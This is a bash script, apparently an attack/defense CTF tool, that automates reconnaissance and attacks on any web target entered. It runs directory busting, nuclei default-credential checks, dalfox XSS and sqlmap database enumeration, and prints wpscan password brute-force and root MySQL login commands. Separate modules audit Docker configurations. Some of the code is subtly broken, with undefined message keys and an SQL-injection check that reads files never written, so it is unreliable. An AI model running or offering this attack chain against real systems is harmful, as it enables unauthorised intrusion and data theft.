#!/bin/bash

# CTF Fortress v20.0 (Ultimate Polyglot Edition)
# Features: Web Attack, Cloud, GraphQL, Docker Audit, Multi-Language (RU/EN)
# Author: Perplexity AI Assistant & User

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' 
BOLD='\033[1m'

# Глобальные переменные
TARGET=""
COOKIE=""
AUTH_HEADER=""
REPORT_DIR=""
CLEAN_HOST=""
CLEAN_DOMAIN=""
LANG_MODE="EN"

# --- ЛОКАЛИЗАЦИЯ (TEXT RESOURCES) ---

set_language() {
    clear
    echo -e "${CYAN}Select Language / Выберите язык:${NC}"
    echo "   1) English"
    echo "   2) Русский"
    read -p "> " L_OPT
    case $L_OPT in
        2) LANG_MODE="RU" ;;
        *) LANG_MODE="EN" ;;
    esac
}

get_text() {
    if [ "$LANG_MODE" == "RU" ]; then
        case $1 in
            "banner_desc") echo "Web Эксплойтер & Docker Аудитор";;
            "select_mode") echo "Выберите режим работы:";;
            "mode_1") echo "1) Веб-атака (A/D CTF) - Полный цикл";;
            "mode_2") echo "2) Аудит инфраструктуры (Dockerfile)";;
            "mode_3") echo "3) Аудит инфраструктуры (Docker Compose)";;
            "mode_4") echo "4) Установка / Обновление утилит";;
            "enter_target") echo "Введите цель (например, http://10.10.20.5):";;
            "check_conn") echo "[*] Проверка соединения...";;
            "host_up") echo "[+] Хост доступен";;
            "host_down") echo "[!] Хост недоступен!";;
            "check_backups") echo "[*] Поиск забытых бэкапов...";;
            "check_swagger") echo "[*] Поиск документации API (Swagger)...";;
            "check_cors") echo "[*] Проверка CORS...";;
            "check_graphql") echo "[*] Проверка GraphQL Introspection...";;
            "check_cloud") echo "[*] Поиск облачных бакетов (S3)...";;
            "found") echo "[!] НАЙДЕНО:";;
            "vuln_cors") echo "[!!!] КРИТИЧЕСКАЯ УЯЗВИМОСТЬ CORS";;
            "scan_ports") echo "Скан портов...";;
            "tech_stack") echo "Стек технологий...";;
            "dir_busting") echo "Перебор директорий...";;
            "crawling") echo "Краулинг ссылок...";;
            "active_attack") echo "Активные атаки (SQLMap/XSS)...";;
            "guide_title") echo "=== ФАЗА 3: ИНСТРУКЦИЯ ПО ЭКСПЛУАТАЦИИ ===";;
            "report_saved") echo "[V] Отчет сохранен:";;
            "visual_saved") echo "[V] Карта атаки сохранена:";;
            "audit_fail") echo "[ОПАСНО]";;
            "audit_pass") echo "[OK]";;
            "priv_warn") echo "Обнаружен режим 'privileged: true' (Рут на хосте)";;
            "sock_warn") echo "Проброс Docker Socket (Захват хоста)";;
            "root_warn") echo "Сервис запущен от root";;
            "net_warn") echo "Отсутствует сетевая изоляция (host network)";;
            "pass_warn") echo "Пароли в открытом виде (ENV)";;
        esac
    else
        # English Defaults
        case $1 in
            "banner_desc") echo "Web Exploiter & Docker Auditor";;
            "select_mode") echo "Select Operation Mode:";;
            "mode_1") echo "1) Web Attack (A/D CTF) - Full Auto Pwn";;
            "mode_2") echo "2) Infrastructure Audit (Dockerfile Analysis)";;
            "mode_3") echo "3) Infrastructure Audit (Docker Compose Analysis)";;
            "mode_4") echo "4) Setup / Update Tools";;
            "enter_target") echo "Enter Target URL (e.g., http://10.10.20.5):";;
            "check_conn") echo "[*] Checking connectivity...";;
            "host_up") echo "[+] Host is UP";;
            "host_down") echo "[!] Host unreachable!";;
            "check_backups") echo "[*] Checking for Backup Files...";;
            "check_swagger") echo "[*] Checking for API Docs...";;
            "check_cors") echo "[*] Checking CORS Misconfiguration...";;
            "check_graphql") echo "[*] Checking GraphQL Introspection...";;
            "check_cloud") echo "[*] Checking Cloud Buckets...";;
            "found") echo "[!] FOUND:";;
            "vuln_cors") echo "[!!!] CRITICAL CORS VULNERABILITY";;
            "scan_ports") echo "Port Scan...";;
            "tech_stack") echo "Tech Stack...";;
            "dir_busting") echo "Dir Busting...";;
            "crawling") echo "Crawling...";;
            "active_attack") echo "Active Attacks (SQLMap/XSS)...";;
            "guide_title") echo "=== PHASE 3: EXPLOITATION GUIDE ===";;
            "report_saved") echo "[V] Report Saved:";;
            "visual_saved") echo "[V] Visual Map Generated:";;
            "audit_fail") echo "[FAIL]";;
            "audit_pass") echo "[PASS]";;
            "priv_warn") echo "'privileged: true' DETECTED! (Root access to host)";;
            "sock_warn") echo "Docker Socket Mounted! (Host takeover possible)";;
            "root_warn") echo "Explicit root user defined!";;
            "net_warn") echo "Host network mode used (No isolation)";;
            "pass_warn") echo "Passwords in plain text environment variables!";;
        esac
    fi
}

print_banner() {
    clear
    echo -e "${CYAN}"
    echo "   CTF Fortress v20.0 - $(get_text "banner_desc")"
    echo ""
}

install_tools() {
    echo -e "${YELLOW}[*] Installing Dependencies...${NC}"
    sudo apt-get update && sudo apt-get install -y ruby ruby-dev libxml2 libxml2-dev libxslt-dev build-essential nmap jq curl git golang sqlmap python3-pip exploitdb yq npm
    
    echo -e "${BLUE}[+] Go Tools...${NC}"
    go install github.com/projectdiscovery/katana/cmd/katana@latest
    go install github.com/hahwul/dalfox/v2@latest
    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    go install github.com/ffuf/ffuf/v2@latest
    go install github.com/zricethezav/gitleaks/v8@latest
    
    echo -e "${BLUE}[+] Python Tools...${NC}"
    pip3 install arjun commix --break-system-packages 2>/dev/null || pip3 install arjun commix
    
    echo -e "${BLUE}[+] Wordlists...${NC}"
    sudo mkdir -p /usr/share/seclists/Discovery/Web-Content/
    if [ ! -f "/usr/share/seclists/Discovery/Web-Content/common.txt" ]; then sudo curl -o /usr/share/seclists/Discovery/Web-Content/common.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt; fi
    
    export PATH=$PATH:$(go env GOPATH)/bin
    nuclei -update-templates
    
    if [ -d "/opt/WhatWeb" ]; then sudo rm -rf /opt/WhatWeb; fi
    sudo git clone https://github.com/urbanadventurer/WhatWeb.git /opt/WhatWeb
    sudo gem install bson_ext mongo rchardet addressable
    
    if ! command -v hadolint &> /dev/null; then
        echo -e "${BLUE}[+] Installing Hadolint...${NC}"
        sudo wget -O /usr/local/bin/hadolint https://github.com/hadolint/hadolint/releases/latest/download/hadolint-Linux-x86_64
        sudo chmod +x /usr/local/bin/hadolint
    fi

    echo -e "${GREEN}[V] Setup Complete.${NC}"
    read -p "Press Enter..."
}

# --- NEW MODULES (CLOUD / API / GRAPHQL) ---

check_graphql() {
    echo -e "${YELLOW}$(get_text "check_graphql")${NC}"
    GQL_PATHS="graphql api/graphql v1/graphql graphql/console"
    FOUND_GQL=0
    INTROSPECTION='{"query":"{__schema{types{name,kind,description}}}"}'
    
    for path in $GQL_PATHS; do
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$INTROSPECTION" "$TARGET/$path")
        if [[ "$HTTP_CODE" == "200" ]]; then
            echo -e "    ${RED}$(get_text "found") $TARGET/$path${NC}"
            echo "$TARGET/$path" >> "$REPORT_DIR/graphql_found.txt"
            FOUND_GQL=1
            curl -s -X POST -H "Content-Type: application/json" -d "$INTROSPECTION" "$TARGET/$path" > "$REPORT_DIR/graphql_schema_sample.json"
        fi
    done
}

check_cloud_buckets() {
    echo -e "${YELLOW}$(get_text "check_cloud")${NC}"
    KEYWORDS="$CLEAN_DOMAIN ${CLEAN_DOMAIN}-dev ${CLEAN_DOMAIN}-backup ${CLEAN_DOMAIN}-assets"
    
    for keyword in $KEYWORDS; do
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://${keyword}.s3.amazonaws.com")
        if [[ "$HTTP_CODE" == "200" ]]; then
            echo -e "    ${RED}$(get_text "found") https://${keyword}.s3.amazonaws.com${NC}"
            echo "https://${keyword}.s3.amazonaws.com" >> "$REPORT_DIR/cloud_buckets.txt"
        fi
    done
}

check_backups() {
    echo -e "${YELLOW}$(get_text "check_backups")${NC}"
    BACKUPS="www.zip backup.zip backup.sql site.tar.gz .env .git/config config.php.bak"
    
    for file in $BACKUPS; do
        HTTP_CODE=$(curl -o /dev/null -s -w "%{http_code}" "$TARGET/$file")
        if [[ "$HTTP_CODE" == "200" ]]; then
            echo -e "    ${RED}$(get_text "found") $TARGET/$file${NC}"
            echo "$TARGET/$file" >> "$REPORT_DIR/backups_found.txt"
        fi
    done
}

check_swagger() {
    echo -e "${YELLOW}$(get_text "check_swagger")${NC}"
    SWAGGER_PATHS="v2/api-docs swagger.json api/docs swagger-ui.html api/swagger.json"
    for path in $SWAGGER_PATHS; do
        HTTP_CODE=$(curl -o /dev/null -s -w "%{http_code}" "$TARGET/$path")
        if [[ "$HTTP_CODE" == "200" ]]; then
            echo -e "    ${RED}$(get_text "found") $TARGET/$path${NC}"
            echo "$TARGET/$path" >> "$REPORT_DIR/api_docs.txt"
        fi
    done
}

check_cors() {
    echo -e "${YELLOW}$(get_text "check_cors")${NC}"
    RESP=$(curl -s -I -H "Origin: https://evil.com" "$TARGET")
    if echo "$RESP" | grep -q "Access-Control-Allow-Origin: https://evil.com" && echo "$RESP" | grep -q "Access-Control-Allow-Credentials: true"; then
        echo -e "    ${RED}$(get_text "vuln_cors")${NC}"
        echo "CORS_VULNERABLE" > "$REPORT_DIR/cors_vuln.txt"
    else
        echo -e "    [+] CORS seems safe.";
    fi
}

# --- WEB ATTACK MODULES ---

ask_target() {
    echo -e "${CYAN}$(get_text "enter_target")${NC}"
    read -p "> " TARGET_INPUT
    if [ -z "$TARGET_INPUT" ]; then ask_target; return; fi
    if [[ "$TARGET_INPUT" != http* ]]; then TARGET="http://$TARGET_INPUT"; else TARGET="$TARGET_INPUT"; fi
    TARGET=${TARGET%/}
    
    CLEAN_URL=${TARGET#*://}
    CLEAN_URL=${CLEAN_URL%%/*}
    HOST=${CLEAN_URL%%:*}
    PORT=${CLEAN_URL##*:}
    if [ "$HOST" == "$PORT" ]; then PORT="80"; fi
    
    CLEAN_DOMAIN=${HOST#www.}
    REPORT_DIR="recon_reports/${HOST}_${PORT}_$(date +%H%M)"
    mkdir -p "$REPORT_DIR"
}

phase_1_recon() {
    echo -e "\n${BLUE}=== PHASE 1: RECON & CSP ===${NC}"
    echo -e "${YELLOW}$(get_text "check_conn")${NC}"
    HTTP_CODE=$(curl -o /dev/null -s -w "%{http_code}\n" --connect-timeout 3 "$TARGET")
    if [ "$HTTP_CODE" == "000" ]; then echo -e "${RED}$(get_text "host_down")${NC}"; exit 1; fi
    echo -e "${GREEN}$(get_text "host_up") ($HTTP_CODE)${NC}"

    CSP_HEADER=$(curl -s -I "$TARGET" | grep -i "Content-Security-Policy" | cut -d: -f2- | tr -d '\r')
    if [ -z "$CSP_HEADER" ]; then
        echo -e "${RED}$(get_text "csp_missing")${NC}"
        echo "MISSING" > "$REPORT_DIR/csp_verdict.txt"
    else
        echo -e "    CSP: ${CYAN}PRESENT${NC}"
        echo "$CSP_HEADER" > "$REPORT_DIR/csp_raw.txt"
        if [[ "$CSP_HEADER" == *"unsafe-inline"* ]]; then echo "- unsafe-inline" >> "$REPORT_DIR/csp_vulns.txt"; fi
    fi

    nuclei -u "$TARGET" -tags default-login,weak-credentials -o "$REPORT_DIR/creds_found.txt" -silent
    if [ -s "$REPORT_DIR/creds_found.txt" ]; then
        echo -e "${RED}$(get_text "creds_found")${NC}"
        cat "$REPORT_DIR/creds_found.txt"
    fi
}

ask_auth() {
    echo -e "\n${CYAN}[?] Authentication:${NC}"
    echo "   1) Cookie"
    echo "   2) Basic Auth"
    echo "   3) No Auth"
    echo -e "${YELLOW}   Select [1-3]:${NC}"
    read -p "> " AUTH_CHOICE
    case $AUTH_CHOICE in
        1) read -p "Paste Cookie: " C; COOKIE=$(echo "$C" | tr -d '"' | tr -d "'"); echo "Cookie Set.";;
        2) read -p "User:Pass: " A; AUTH_HEADER="Authorization: Basic $(echo -n $A | base64)";;
        *) echo "No Auth.";;
    esac
}

phase_2_deep_scan() {
    echo -e "\n${BLUE}=== PHASE 2: DEEP SCAN ===${NC}"
    export PATH=$PATH:$(go env GOPATH)/bin
    KATANA_ARGS=""; NUCLEI_ARGS=""; SQLMAP_ARGS=""; DALFOX_ARGS=""
    if [ -n "$COOKIE" ]; then
        KATANA_ARGS="-H \"Cookie: $COOKIE\""; NUCLEI_ARGS="-H \"Cookie: $COOKIE\""
        SQLMAP_ARGS="--cookie=\"$COOKIE\""; DALFOX_ARGS="--header \"Cookie: $COOKIE\""
    fi

    # EXTRA CHECKS v19/v20
    check_backups
    check_swagger
    check_cors
    check_graphql
    check_cloud_buckets

    echo -e "\n${YELLOW}[0/6] $(get_text "scan_ports")${NC}"
    CLEAN_HOST=${TARGET#*://}; CLEAN_HOST=${CLEAN_HOST%%/*}; CLEAN_HOST=${CLEAN_HOST%%:*}
    nmap -F -T4 --open "$CLEAN_HOST" -oN "$REPORT_DIR/nmap.txt" > /dev/null 2>&1
    grep "open" "$REPORT_DIR/nmap.txt" | cut -d/ -f1 | tr '\n' ', '

    echo -e "\n${YELLOW}[1/6] $(get_text "tech_stack")${NC}"
    /opt/WhatWeb/whatweb "$TARGET" --color=never > "$REPORT_DIR/tech.txt" 2>/dev/null
    grep -oE '[a-zA-Z0-9._-]+\[' "$REPORT_DIR/tech.txt" | tr -d '[' | sort -u | tr '\n' ', '

    echo -e "\n${YELLOW}[2/6] $(get_text "dir_busting")${NC}"
    eval "ffuf -u \"${TARGET}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac -mc 200,301,302 -fc 404 -recursion-depth 1 -t 50 -s -o \"$REPORT_DIR/ffuf.json\" $KATANA_ARGS"
    if [ -f "$REPORT_DIR/ffuf.json" ]; then cat "$REPORT_DIR/ffuf.json" | jq -r '.results[] | .url' > "$REPORT_DIR/ffuf_found.txt" 2>/dev/null; fi

    echo -e "\n${YELLOW}[3/6] $(get_text "crawling")${NC}"
    eval "katana -u \"$TARGET\" $KATANA_ARGS -d 2 -c 10 -silent -o \"$REPORT_DIR/urls.txt\""
    if [ -s "$REPORT_DIR/ffuf_found.txt" ]; then cat "$REPORT_DIR/ffuf_found.txt" >> "$REPORT_DIR/urls.txt"; fi
    
    echo -e "\n${YELLOW}[4/6] Vuln Scan (Nuclei)...${NC}"
    eval "nuclei -u \"$TARGET\" $NUCLEI_ARGS -tags cve,misconfig,exposure,panel -severity low,medium,high,critical -o \"$REPORT_DIR/nuclei.txt\" -silent"

    echo -e "${YELLOW}[5/6] $(get_text "active_attack")${NC}"
    grep "?" "$REPORT_DIR/urls.txt" > "$REPORT_DIR/params.txt"
    if [ -s "$REPORT_DIR/params.txt" ]; then
        head -n 5 "$REPORT_DIR/params.txt" | eval "dalfox pipe $DALFOX_ARGS --skip-mining-all --silence --timeout 5 > \"$REPORT_DIR/xss.txt\" &"
        head -n 3 "$REPORT_DIR/params.txt" | while read u; do eval "sqlmap -u \"$u\" $SQLMAP_ARGS --batch --smart --dbs --random-agent --timeout 15 > /dev/null"; done
    fi
    wait
}

generate_visual_report() {
    VISUAL_RPT="$REPORT_DIR/ATTACK_MAP.mmd"
    echo "graph TD" > "$VISUAL_RPT"
    echo "    User((Attacker)) -->|Start| Target($TARGET)" >> "$VISUAL_RPT"
    
    if [ -f "$REPORT_DIR/nmap.txt" ]; then
        PORTS=$(grep "open" "$REPORT_DIR/nmap.txt" | cut -d/ -f1 | tr '\n' ',')
        echo "    Target -->|Open Ports| Ports[${PORTS%,}]" >> "$VISUAL_RPT"
        echo "    style Ports fill:#f9f,stroke:#333,stroke-width:2px" >> "$VISUAL_RPT"
    fi
    
    if [ -s "$REPORT_DIR/creds_found.txt" ]; then
        echo "    Target -->|VULN| Creds(Credentials Found!)" >> "$VISUAL_RPT"
        echo "    style Creds fill:#f00,stroke:#333,stroke-width:4px" >> "$VISUAL_RPT"
    fi
    if [ -s "$REPORT_DIR/backups_found.txt" ]; then
        echo "    Target -->|VULN| Backups(Backup Files)" >> "$VISUAL_RPT"
        echo "    style Backups fill:#ff0,stroke:#333" >> "$VISUAL_RPT"
    fi
    if grep -r "available databases" "$REPORT_DIR"/sqlmap_* >/dev/null 2>&1; then
        echo "    Target -->|VULN| SQLi(SQL Injection)" >> "$VISUAL_RPT"
        echo "    style SQLi fill:#f00,stroke:#333,stroke-width:4px" >> "$VISUAL_RPT"
    fi
    if [ -s "$REPORT_DIR/graphql_found.txt" ]; then
        echo "    Target -->|Feature| GQL(GraphQL API)" >> "$VISUAL_RPT"
    fi
    
    echo -e "\n${GREEN}$(get_text "visual_saved") $VISUAL_RPT${NC}"
}

generate_report() {
    FINAL_RPT="$REPORT_DIR/FINAL_REPORT.md"
    echo "# Scan Report: $TARGET" > "$FINAL_RPT"
    echo "Date: $(date)" >> "$FINAL_RPT"
    
    echo -e "\n## 1. Critical Findings" >> "$FINAL_RPT"
    if [ -s "$REPORT_DIR/backups_found.txt" ]; then echo "- BACKUP FILES FOUND! (Download immediately)" >> "$FINAL_RPT"; fi
    if [ -s "$REPORT_DIR/api_docs.txt" ]; then echo "- API Documentation Found (Map the API)" >> "$FINAL_RPT"; fi
    if [ -s "$REPORT_DIR/graphql_found.txt" ]; then echo "- GraphQL Introspection Open" >> "$FINAL_RPT"; fi
    if [ -s "$REPORT_DIR/cloud_buckets.txt" ]; then echo "- Open S3 Buckets Found" >> "$FINAL_RPT"; fi
    if [ -f "$REPORT_DIR/cors_vuln.txt" ]; then echo "- Critical CORS Vulnerability" >> "$FINAL_RPT"; fi
    if grep -q "wp-user-enum" "$REPORT_DIR/nuclei.txt"; then
        echo "- WordPress User Found: $(grep "wp-user-enum" "$REPORT_DIR/nuclei.txt" | grep -oP '\["\K[^"]+')" >> "$FINAL_RPT"
    fi
    if [ -s "$REPORT_DIR/creds_found.txt" ]; then echo "- Credentials Found!" >> "$FINAL_RPT"; fi
    if grep -q "3306" "$REPORT_DIR/nmap.txt"; then echo "- MySQL Exposed (Port 3306)" >> "$FINAL_RPT"; fi
    if grep -q "21" "$REPORT_DIR/nmap.txt"; then echo "- FTP Exposed (Port 21)" >> "$FINAL_RPT"; fi
    if [ -f "$REPORT_DIR/csp_verdict.txt" ] && grep -q "MISSING" "$REPORT_DIR/csp_verdict.txt"; then echo "- CSP Missing" >> "$FINAL_RPT"; fi
    if grep -r "available databases" "$REPORT_DIR"/sqlmap_* >/dev/null 2>&1; then echo "- SQL Injection Confirmed" >> "$FINAL_RPT"; fi

    echo -e "\n## 2. Vulnerabilities (Nuclei)" >> "$FINAL_RPT"
    if [ -s "$REPORT_DIR/nuclei.txt" ]; then cat "$REPORT_DIR/nuclei.txt" >> "$FINAL_RPT"; fi

    echo -e "\n## 3. Open Ports" >> "$FINAL_RPT"
    if [ -f "$REPORT_DIR/nmap.txt" ]; then grep "open" "$REPORT_DIR/nmap.txt" >> "$FINAL_RPT"; fi

    echo -e "\n## 4. Attack Surface" >> "$FINAL_RPT"
    head -n 20 "$REPORT_DIR/urls.txt" >> "$FINAL_RPT"
    
    echo -e "\n${GREEN}$(get_text "report_saved") $FINAL_RPT${NC}"
}

phase_3_guide() {
    echo -e "\n${BLUE}$(get_text "guide_title")${NC}"
    
    if [ -s "$REPORT_DIR/graphql_found.txt" ]; then
        echo -e "\n${RED}[+] GRAPHQL OPEN${NC}"
        echo -e "   Endpoint: $(head -n1 "$REPORT_DIR/graphql_found.txt")"
        echo -e "${GREEN}   >>> EXPLOIT:${NC} Use 'InQL' or 'GraphQL Voyager' to map the schema."
    fi

    if [ -s "$REPORT_DIR/backups_found.txt" ]; then
        echo -e "\n${RED}[+] BACKUP FILES FOUND${NC}"
        cat "$REPORT_DIR/backups_found.txt"
        echo -e "${GREEN}   >>> EXPLOIT:${NC} Download these files! They contain source code/passwords."
    fi

    if grep -q "wp-user-enum" "$REPORT_DIR/nuclei.txt"; then
        WP_USER=$(grep "wp-user-enum" "$REPORT_DIR/nuclei.txt" | grep -oP '\["\K[^"]+')
        echo -e "\n${RED}[+] WORDPRESS ADMIN FOUND: $WP_USER${NC}"
        echo -e "${GREEN}   >>> EXPLOIT:${NC} wpscan --url $TARGET --usernames $WP_USER --passwords rockyou.txt"
    fi

    if grep -q "3306" "$REPORT_DIR/nmap.txt"; then
        echo -e "\n${RED}[+] OPEN MYSQL (3306)${NC}"
        echo -e "${GREEN}   >>> EXPLOIT:${NC} mysql -h $CLEAN_HOST -u root"
    fi
    
    if grep -q "MISSING" "$REPORT_DIR/csp_verdict.txt" 2>/dev/null; then
        echo -e "\n${YELLOW}[+] CSP MISSING${NC}"
        echo -e "   Simple XSS payloads will work here."
    fi

    if grep -r "available databases" "$REPORT_DIR"/sqlmap_* >/dev/null 2>&1; then
        echo -e "\n${RED}[+] SQL INJECTION CONFIRMED${NC}"
        echo -e "${GREEN}   >>> EXPLOIT:${NC} Check sqlmap output folder in $REPORT_DIR"
    fi

    generate_report
    generate_visual_report
}

# --- INFRASTRUCTURE AUDIT MODULES ---

audit_docker() {
    echo -e "\n${PURPLE}=== DOCKERFILE SECURITY AUDIT ===${NC}"
    echo "$(get_text "enter_path") (default: ./Dockerfile):"
    read -e DOCKERFILE_PATH
    DOCKERFILE_PATH=${DOCKERFILE_PATH:-./Dockerfile}

    if [ ! -f "$DOCKERFILE_PATH" ]; then echo -e "${RED}File not found!${NC}"; return; fi
    
    AUDIT_DIR="audit_reports/docker_$(date +%H%M)"
    mkdir -p "$AUDIT_DIR"
    REPORT="$AUDIT_DIR/DOCKER_AUDIT.md"
    echo "# Dockerfile Audit Report" > "$REPORT"

    echo -e "${YELLOW}[*] Running Hadolint...${NC}"
    hadolint "$DOCKERFILE_PATH" > "$AUDIT_DIR/hadolint.txt"
    if [ -s "$AUDIT_DIR/hadolint.txt" ]; then
        echo "### Hadolint Issues" >> "$REPORT"
        cat "$AUDIT_DIR/hadolint.txt" >> "$REPORT"
    else
        echo -e "${GREEN}Hadolint: OK${NC}"
    fi

    echo -e "${YELLOW}[*] Manual Checks...${NC}"
    echo "### Critical Checks" >> "$REPORT"
    
    if grep -q "USER root" "$DOCKERFILE_PATH" || ! grep -q "USER" "$DOCKERFILE_PATH"; then
        echo -e "${RED}$(get_text "audit_fail") $(get_text "root_warn")${NC}"
        echo "- [FAIL] $(get_text "root_warn")" >> "$REPORT"
    else
        echo -e "${GREEN}$(get_text "audit_pass") User instruction found.${NC}"
    fi

    if grep -E "password|secret|key|token" -i "$DOCKERFILE_PATH"; then
        echo -e "${RED}$(get_text "audit_fail") $(get_text "pass_warn")${NC}"
        echo "- [FAIL] $(get_text "pass_warn")" >> "$REPORT"
    fi

    echo -e "${GREEN}$(get_text "report_saved") $REPORT${NC}"
}

audit_compose() {
    echo -e "\n${PURPLE}=== DOCKER-COMPOSE AUDIT ===${NC}"
    echo "$(get_text "enter_path") (default: ./docker-compose.yml):"
    read -e COMPOSE_PATH
    COMPOSE_PATH=${COMPOSE_PATH:-./docker-compose.yml}

    if [ ! -f "$COMPOSE_PATH" ]; then echo -e "${RED}File not found!${NC}"; return; fi
    
    AUDIT_DIR="audit_reports/compose_$(date +%H%M)"
    mkdir -p "$AUDIT_DIR"
    REPORT="$AUDIT_DIR/COMPOSE_AUDIT.md"
    echo "# Docker-Compose Audit Report" > "$REPORT"

    echo -e "${YELLOW}[*] Scanning Configuration...${NC}"
    
    if grep -q "privileged: true" "$COMPOSE_PATH"; then
        echo -e "${RED}$(get_text "audit_fail") $(get_text "priv_warn")${NC}"
        echo "- [CRITICAL] $(get_text "priv_warn")" >> "$REPORT"
    fi

    if grep -q "/var/run/docker.sock" "$COMPOSE_PATH"; then
        echo -e "${RED}$(get_text "audit_fail") $(get_text "sock_warn")${NC}"
        echo "- [CRITICAL] $(get_text "sock_warn")" >> "$REPORT"
    fi

    if grep -q "user: root" "$COMPOSE_PATH" || grep -q "user: '0'" "$COMPOSE_PATH"; then
        echo -e "${RED}$(get_text "audit_fail") $(get_text "root_warn")${NC}"
        echo "- [FAIL] $(get_text "root_warn")" >> "$REPORT"
    fi

    if grep -q "network_mode: host" "$COMPOSE_PATH"; then
        echo -e "${YELLOW}$(get_text "audit_fail") $(get_text "net_warn")${NC}"
        echo "- [WARN] $(get_text "net_warn")" >> "$REPORT"
    fi

    if grep -E "MYSQL_ROOT_PASSWORD|POSTGRES_PASSWORD|SECRET_KEY" "$COMPOSE_PATH"; then
         echo -e "${YELLOW}$(get_text "audit_fail") $(get_text "pass_warn")${NC}"
         echo "- [WARN] $(get_text "pass_warn")" >> "$REPORT"
    fi
    
    echo -e "${GREEN}$(get_text "report_saved") $REPORT${NC}"
}

# --- MAIN MENU ---

main_menu() {
    set_language
    print_banner
    echo -e "${CYAN}$(get_text "select_mode")${NC}"
    echo "   $(get_text "mode_1")"
    echo "   $(get_text "mode_2")"
    echo "   $(get_text "mode_3")"
    echo "   $(get_text "mode_4")"
    echo -e "${YELLOW}   Option [1-4]:${NC}"
    read -p "> " OPTION

    case $OPTION in
        1)
            ask_target
            phase_1_recon
            ask_auth
            phase_2_deep_scan
            phase_3_guide
            ;;
        2) audit_docker ;;
        3) audit_compose ;;
        4) install_tools ;;
        *) echo "Invalid option";;
    esac
}

main_menu
